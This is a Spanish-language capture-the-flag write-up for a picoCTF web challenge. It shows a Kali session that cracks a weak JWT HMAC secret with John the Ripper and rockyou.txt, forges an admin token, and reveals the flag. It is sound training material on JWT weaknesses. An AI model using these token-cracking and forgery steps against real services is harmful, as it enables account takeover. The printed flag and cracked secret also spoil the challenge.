**Reto**
	
**Descripción**
	Check the admin scratchpad! http://fickle-tempest.picoctf.net:62367

**Solución**
	1. Usando el navegador Mozilla Firefox, CLI y https://www.jwt.io/#debugger.io (como codificador[encoder]).
		┌──(kali㉿kali)-[~]
		└─$ nano hash_jawt_pico 
		                                                                                                 
		┌──(kali㉿kali)-[~]
		└─$ cat hash_jawt_pico 
		eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiTHVpNSJ9.-h0msaaC8Q8VQoqn0oHnwAceFF2T5D4RALG0K4UC2bc
		                                                                                                 
		┌──(kali㉿kali)-[~]
		└─$ ls /usr/share/wordlists
		dirb       dnsmap.txt     fern-wifi  legion      nmap.lst        sqlmap.txt  wifite.txt
		dirbuster  fasttrack.txt  john.lst   metasploit  rockyou.txt.gz  wfuzz
		                                                                                                 
		┌──(kali㉿kali)-[~]
		└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
		[sudo] password for kali: 
		                                                                                                 
		┌──(kali㉿kali)-[~]
		└─$ ls /usr/share/wordlists                         
		dirb       dnsmap.txt     fern-wifi  legion      nmap.lst     sqlmap.txt  wifite.txt
		dirbuster  fasttrack.txt  john.lst   metasploit  rockyou.txt  wfuzz
		                                                                                                 
		┌──(kali㉿kali)-[~]
		└─$ head /usr/share/wordlists/rockyou.txt
		123456
		12345
		123456789
		password
		iloveyou
		princess
		1234567
		rockyou
		12345678
		abc123
		                                                                                                 
		┌──(kali㉿kali)-[~]
		└─$ john hash_jawt_pico -w=/usr/share/wordlists/rockyou.txt
		Using default input encoding: UTF-8
		Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
		Will run 2 OpenMP threads
		Press 'q' or Ctrl-C to abort, almost any other key for status
		ilovepico        (?)     
		1g 0:00:00:04 DONE (2026-03-01 21:25) 0.1897g/s 1403Kp/s 1403Kc/s 1403KC/s iloverob4live345..ilovepatri
		Use the "--show" option to display all of the cracked passwords reliably
		Session completed. 
		                                                                                                 
		┌──(kali㉿kali)-[~]
		└─$ 

		Entrar a la pagina: https://www.jwt.io/#debugger.io y codificar el nuevo json codificado
			eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
		
		picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}

**Notes**
	1. El reto consiste en explotar una mala implementación de autenticación basada en JSON Web Token (JWT).
	2. Al iniciar sesión en el sitio, se obtuvo un token JWT almacenado en la sesión del navegador.
	3. El token fue extraído manualmente y guardado en un archivo para su análisis.
	4. Se identificó la estructura estándar del JWT:
		header.payload.signature
	5. El algoritmo utilizado fue HS256 (HMAC-SHA256), lo que indica que el servidor firma el token usando una clave secreta.
	6. Se intentó obtener la clave secreta mediante ataque de diccionario usando John the Ripper.
	7. Se utilizó la wordlist rockyou.txt para realizar fuerza bruta sobre la firma del JWT.
	8. La contraseña (secret key) descubierta fue:
		ilovepico
	9. Con la clave obtenida, se modificó el payload del token cambiando el usuario:
		"user":"Luis" → "user":"admin"
	10. El nuevo JWT fue generado nuevamente firmándolo con la clave secreta descubierta.
	11. Se utilizó jwt.io para codificar y firmar correctamente el nuevo token.
	12. El token modificado fue reemplazado en la sesión del navegador para suplantar al usuario administrador.
	13. Al acceder como admin, el sistema mostró el admin scratchpad con la bandera.
	14. Tipo de vulnerabilidad explotada:
	    - Broken Authentication
	    - Weak JWT Secret
	    - Privilege Escalation
	15. Conceptos clave:
	    15.1. JWT no está cifrado, solo firmado.
	    15.2. Si la clave secreta es débil, puede romperse mediante diccionario.
	    15.3. Modificar el payload permite escalar privilegios si se puede volver a firmar el token.
	    15.4. Herramientas como John the Ripper permiten atacar firmas HMAC.

**Referencias**
	